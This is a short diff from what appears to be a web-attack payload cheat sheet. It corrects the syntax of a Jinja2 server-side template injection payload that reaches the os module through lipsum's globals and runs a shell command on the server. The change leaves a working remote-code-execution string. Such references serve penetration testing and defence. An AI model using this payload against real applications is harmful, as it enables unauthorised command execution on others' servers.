@@ -576,7 +576,7 @@ Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/
 With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:
 
 ```python
-{{ lipsum.__globals__.["os"].popen('id').read() }}
+{{ lipsum.__globals__["os"].popen('id').read() }}
 ```
 
 Source: https://twitter.com/podalirius_/status/1655970628648697860
